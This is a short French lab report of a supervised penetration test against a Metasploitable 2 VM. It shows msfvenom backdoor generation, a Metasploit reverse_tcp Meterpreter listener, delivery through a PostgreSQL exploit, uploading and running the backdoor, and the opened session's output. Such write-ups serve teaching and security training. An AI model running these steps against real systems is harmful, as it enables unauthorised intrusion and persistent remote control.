## Rapport de Test d'Intrusion - Laboratoire Contrôlé
```
Auteur : SALEM KAWEINA NGAMDERE
Date : 30 Mai 2025
Environnement : Local Lab (VM Kali Linux + Metasploitable 2.0)
```

## 1. Introduction
    • Objectif : Démontrer les étapes d'un contrôle d’un systeme par  backdoor.
    • Autorisation : Exercice académique sous supervision.
    • - msfvenom (version X.Y)
    • - Metasploit Framework
    • - Machine cible : Ubuntu 
# 2. Méthodologie
Étape 1 : Création du Payload (Backdoor)
    • Outil : msfvenom 
      msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>
        ◦ Description :
            ▪ Génération d'un payload pour la cible (Ubuntu, architecture x86).
            ▪ Format de sortie .elf
            
# Étape 2 : Mise en place de l'Écouteur (Listener)
    • Outil : Metasploit (multi/handler)
        msf6 > use exploit/multi/handler
        msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
        
    • Paramétrage de l'Écouteur
```
      msf6 exploit(multi/handler) > set LHOST X.X.X.X
      msf6 exploit(multi/handler) > set LPORT PORT
      msf6 exploit(multi/handler) > run
	[*] Started reverse TCP handler on X.X.X.X:PORT
```
    
# Étape 3 : Exécution sur la Cible
    • Méthode de livraison 
          Vulnerabilité postgresql  exploitée à travers le payload postgresql_payload. Après obtention de shell meterpreter.
        ◦ Téléchargement du backdoor 
              upload /chemin/backdoor.elf
        ◦ Éxécution du backdoor.
              Chmod +x backdoor.elf   # Pour le backdoor rendre éxécutable
			./backdoor  	#Pour éxécuter le backdoor

    • Établissement de la Session
	Une fois le backdoor éxécuté sur la cible, la session est établie automatiquement
		[*] Started reverse TCP handler on X.X.X.X:PORT 
		[*] Sending stage (989032 bytes) to Y.Y.Y.Y
		[*] Meterpreter session 1 opened ( X.X.X.X:PORT -> Y.Y.Y.Y:PORT ) at X-Y-Z  

#Étape 4 : Exploitation & Post-Exploitation
    • Commandes exécutées :
        ◦ pwd
			/home/msfadmin
        ◦ sysinfo
			Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

